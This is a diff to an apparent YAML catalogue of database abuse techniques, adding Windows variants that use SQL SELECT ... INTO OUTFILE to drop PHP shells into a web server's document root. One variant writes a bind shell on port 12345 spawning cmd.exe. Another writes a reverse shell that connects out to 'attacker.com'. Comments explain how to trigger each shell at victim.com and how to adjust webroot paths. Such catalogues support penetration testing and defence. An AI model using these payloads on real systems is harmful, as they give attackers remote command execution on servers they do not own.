@@ -24,6 +24,19 @@ functions:
     connector: tcp-client
     contexts:
       admin:
+    platform: linux
+    tty: false
+  - code: |
+      SELECT '<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",12345);socket_listen($s,1);$c=socket_accept($s);$p=proc_open("cmd.exe",array(0=>$c,1=>$c,2=>$c),$x); ?>'
+      INTO OUTFILE 'C:/xampp/htdocs/bs.php';
+    comment: "Windows variant: writes a PHP bind shell to the XAMPP webroot using\
+      \ cmd.exe.\nAdjust the OUTFILE path to match the target's webroot (C:/wamp64/www,\
+      \ C:/inetpub/wwwroot, etc.).\nTrigger at http://victim.com/bs.php \u2014 the\
+      \ page hangs while awaiting a connection.\n"
+    connector: tcp-client
+    contexts:
+      admin:
+    platform: windows
     tty: false
   file-read:
   - code: |
@@ -84,12 +97,23 @@ functions:
     comment: "Writes a PHP reverse shell to the webroot via OUTFILE. Trigger the shell\
       \ with an\nHTTP request to http://victim.com/rs.php \u2014 the page hangs while\
       \ the shell is active.\nThe shell runs as the web server user (www-data, apache,\
-      \ etc.).\n\nRequires FILE privilege and an empty secure_file_priv. Windows variant:\
-      \ replace\n/bin/sh with cmd.exe and adjust the OUTFILE path to C:\\xampp\\htdocs\\\
-      rs.php.\n"
+      \ etc.).\nRequires FILE privilege and an empty secure_file_priv.\n"
     contexts:
       admin:
     listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      SELECT '<?php $s=fsockopen("attacker.com",12345);$p=proc_open("cmd.exe",array(0=>$s,1=>$s,2=>$s),$x); ?>'
+      INTO OUTFILE 'C:/xampp/htdocs/rs.php';
+    comment: |
+      Windows variant: writes a PHP reverse shell using cmd.exe to the XAMPP webroot.
+      Adjust the OUTFILE path to match the target's webroot. Trigger at http://victim.com/rs.php.
+    contexts:
+      admin:
+    listener: tcp-server
+    platform: windows
     tty: false
   webshell:
   - code: |
